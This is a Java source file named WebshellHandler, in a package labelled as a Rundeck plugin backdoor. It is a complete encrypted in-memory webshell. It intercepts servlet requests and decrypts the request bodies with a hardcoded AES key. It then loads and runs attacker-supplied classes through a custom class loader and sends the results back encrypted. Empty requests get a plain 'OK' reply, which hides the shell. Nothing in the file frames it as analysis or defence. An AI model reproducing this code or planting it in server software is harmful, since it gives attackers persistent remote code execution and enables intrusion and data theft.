package com.rundeck.plugins.backdoor;

import java.lang.reflect.*;

public class WebshellHandler implements InvocationHandler {
    private final String xc = "3c6e0b8a9c15224a";

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if ("service".equals(method.getName())) {
            handleWebshell(args[0], args[1]);
        }
        return null;
    }

    private void handleWebshell(Object req, Object resp) {
        try {
            Method getHeader = req.getClass().getMethod("getHeader", String.class);
            String lenStr = (String) getHeader.invoke(req, "Content-Length");
            
            if (lenStr == null || lenStr.isEmpty()) {
                resp.getClass().getMethod("setStatus", int.class).invoke(resp, 200);
                Object w = resp.getClass().getMethod("getWriter").invoke(resp);
                w.getClass().getMethod("print", String.class).invoke(w, "OK");
                return;
            }
            
            int len = Integer.parseInt(lenStr);
            byte[] data = new byte[len];
            Object in = req.getClass().getMethod("getInputStream").invoke(req);
            Method read = in.getClass().getMethod("read", byte[].class, int.class, int.class);
            
            int num = 0;
            while (num < len) {
                Integer r = (Integer) read.invoke(in, data, num, len - num);
                if (r == -1) break;
                num += r;
            }
            
            data = x(data, false);
            Object session = req.getClass().getMethod("getSession").invoke(req);
            Object payload = session.getClass().getMethod("getAttribute", String.class).invoke(session, "payload");
            
            if (payload == null) {
                ClassLoader loader = this.getClass().getClassLoader();
                X classLoader = new X(loader);
                Class<?> c = classLoader.Q(data);
                session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "payload", c);
                resp.getClass().getMethod("setStatus", int.class).invoke(resp, 200);
            } else {
                req.getClass().getMethod("setAttribute", String.class, Object.class).invoke(req, "parameters", data);
                Object f = ((Class<?>) payload).newInstance();
                java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                Method eq = f.getClass().getMethod("equals", Object.class);
                eq.invoke(f, out);
                eq.invoke(f, new PageCtx(req, resp, session));
                f.toString();
                
                byte[] result = x(out.toByteArray(), true);
                Object outStream = resp.getClass().getMethod("getOutputStream").invoke(resp);
                outStream.getClass().getMethod("write", byte[].class).invoke(outStream, result);
            }
        } catch (Exception e) {}
    }

    private byte[] x(byte[] s, boolean m) {
        try {
            Class<?> c = Class.forName("javax.crypto.Cipher");
            Object cipher = c.getMethod("getInstance", String.class).invoke(null, "AES");
            Class<?> k = Class.forName("javax.crypto.spec.SecretKeySpec");
            Object key = k.getConstructor(byte[].class, String.class).newInstance(xc.getBytes(), "AES");
            c.getMethod("init", int.class, Class.forName("java.security.Key")).invoke(cipher, m ? 1 : 2, key);
            return (byte[]) c.getMethod("doFinal", byte[].class).invoke(cipher, s);
        } catch (Exception e) {
            return null;
        }
    }

    class X extends ClassLoader {
        public X(ClassLoader z) { super(z); }
        public Class<?> Q(byte[] cb) { return super.defineClass(cb, 0, cb.length); }
    }

    class PageCtx {
        private Object request, response, session;
        PageCtx(Object req, Object resp, Object sess) {
            this.request = req; this.response = resp; this.session = sess;
        }
        public Object getRequest() { return request; }
        public Object getResponse() { return response; }
        public Object getSession() { return session; }
    }
}
